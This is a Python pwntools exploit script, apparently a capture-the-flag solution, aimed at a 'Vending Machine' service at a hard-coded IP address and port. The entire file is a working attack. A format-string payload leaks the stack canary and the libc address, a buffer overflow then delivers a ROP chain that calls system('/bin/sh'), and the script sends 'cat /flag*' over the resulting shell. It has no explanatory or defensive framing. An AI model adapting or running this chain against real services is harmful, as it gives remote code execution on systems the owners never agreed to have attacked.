#!/usr/bin/env python3
"""
Vending Machine PWN - 获取Shell版本
Target: 39.96.193.120:33334
"""
from pwn import *
import socket
import time

def exploit():
    context.log_level = 'info'
    io = remote('39.96.193.120', 33334, timeout=15)
    
    # 1. Leak canary + libc
    io.recvuntil(b'ID:')
    io.send(b'%45$p%10$s' + b'A'*6 + p64(0x404028) + b'\n')
    io.recvuntil(b'Welcome, ')
    raw = io.recvuntil(b'quantity', drop=True)
    
    canary = int(raw[:18].decode(), 16)
    printf_addr = u64(raw[18:24].ljust(8, b'\x00'))
    libc = printf_addr - 0x61c90
    
    log.success(f'canary={hex(canary)}, libc={hex(libc)}')
    
    # 2. Complete first round
    io.send(b'1\n')
    io.recvuntil(b'product')
    io.send(b'a\n')
    io.recvuntil(b'Order confirmed!')
    
    # 3. Round 2: ROP to system
    io.recvuntil(b'ID:')
    io.send(b'X'*30 + b'\n')
    io.recvuntil(b'quantity')
    
    system = libc + 0x52290
    binsh = libc + 0x1b45bd
    pop_rdi = libc + 0x23b6a
    
    # Build payload: 512 overflow with ROP chain
    # After system returns, program continues to main
    payload = b'512\n' + b'A'*264 + p64(canary) + b'B'*8
    payload += p64(pop_rdi) + p64(binsh) + p64(system)
    payload = payload.ljust(512, b'C')
    
    io.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    io.send(payload)
    
    io.recvuntil(b'Order confirmed!')
    log.success('Shell triggered!')
    
    # Wait for output
    time.sleep(2)
    
    # Try to get flag
    io.send(b'cat /flag*\n')
    time.sleep(1)
    
    out = io.recv()
    print(out.decode(errors='replace'))
    
    io.close()

if __name__ == '__main__':
    exploit()